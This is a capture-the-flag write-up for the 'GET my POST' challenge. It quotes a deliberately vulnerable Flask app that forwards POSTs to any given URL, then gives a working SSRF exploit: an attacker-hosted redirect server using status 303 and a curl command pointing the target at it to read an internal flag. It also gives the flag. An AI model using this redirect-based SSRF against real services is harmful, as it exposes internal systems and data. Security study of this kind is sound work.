# GET my POST

> Mr. Mailman, could you GET me that POST?
>
> [https://get-my-post.ecsc25.hack.cert.pl/](https://get-my-post.ecsc25.hack.cert.pl/)
>
> **app.py**
> ```py
> import requests
> from flask import Flask, request, abort
> 
> app = Flask(__name__)
> 
> 
> @app.route('/submit', methods=['POST'])
> def submit():
>     if 'url' in request.json:
>         return requests.post(request.json['url']).content
>     else:
>         abort(404)
> 
> 
> @app.get("/")
> def index():
>     return "You can't connect to this API with your browser. Check the source code."
> 
> 
> assert requests.get("http://internal:5001/flag").content.startswith(b"ecsc")
> 
> if __name__ == "__main__":
>     app.run(port=5000)
> 
> ```
>
> **internal.py**
>
> ```py
> from flask import Flask
> 
> app = Flask(__name__)
> 
> 
> @app.route('/flag', methods=['GET'])
> def flag():
>     return open("flag.txt", 'r').read()
> 
> 
> if __name__ == "__main__":
>     app.run(port=5001)
>
> ```

## Solution
Functions from the `requests` Python module follow redirects by default. A redirect with status code 303 changes the method to GET. Host a simple web app that has a POST endpoint redirecting to `http://internal:5001/flag` and make the bot go there:

```py
from flask import Flask, redirect

app = Flask(__name__)


@app.post('/redir')
def _():
    return redirect('http://internal:5001/flag', 303)


if __name__ == '__main__':
    app.run(host='0', port=80)
```

`$ curl https://get-my-post.ecsc25.hack.cert.pl/submit --json '{"url": "http://YOUR_HOST/redir"}'`

## Flag
`ecsc25{indirect_route}`
